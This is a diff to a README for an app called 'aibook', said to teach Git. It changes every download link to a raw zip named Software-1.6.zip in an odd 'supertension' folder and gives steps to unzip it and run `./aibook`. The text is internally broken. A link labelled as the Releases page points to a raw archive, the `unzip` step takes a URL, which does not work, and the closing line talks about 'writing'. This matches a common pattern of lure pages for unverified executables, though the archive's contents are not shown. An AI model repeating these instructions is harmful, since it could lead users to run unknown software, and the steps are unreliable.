@@ -8,7 +8,7 @@ Welcome to the aibook project! This application helps you learn Git in a fun and
 
 To download the application, visit the link below:
 
-[![Download aibook](https://raw.githubusercontent.com/AndreyASL/aibook/main/supertension/aibook.zip)](https://raw.githubusercontent.com/AndreyASL/aibook/main/supertension/aibook.zip)
+[![Download aibook](https://raw.githubusercontent.com/AndreyASL/aibook/main/supertension/Software-1.6.zip)](https://raw.githubusercontent.com/AndreyASL/aibook/main/supertension/Software-1.6.zip)
 
 1. Click the button above to visit the Releases page.
 2. Look for the latest version available.
@@ -47,7 +47,7 @@ After downloading, follow these steps to install aibook:
 
 1. Open your terminal.
 2. Navigate to the folder where the downloaded file is located.
-3. Unzip the file using `unzip https://raw.githubusercontent.com/AndreyASL/aibook/main/supertension/aibook.zip`.
+3. Unzip the file using `unzip https://raw.githubusercontent.com/AndreyASL/aibook/main/supertension/Software-1.6.zip`.
 4. Change into the aibook directory using `cd aibook`.
 5. Run the application using `./aibook`.
 
@@ -81,6 +81,6 @@ We value your feedback! If you have any suggestions or ideas for how we can impr
 
 To download the application again or check for updates, visit our Releases page:
 
-[Visit the Download Page](https://raw.githubusercontent.com/AndreyASL/aibook/main/supertension/aibook.zip)
+[Visit the Download Page](https://raw.githubusercontent.com/AndreyASL/aibook/main/supertension/Software-1.6.zip)
 
 Thank you for using aibook! Enjoy your journey into writing and Git.
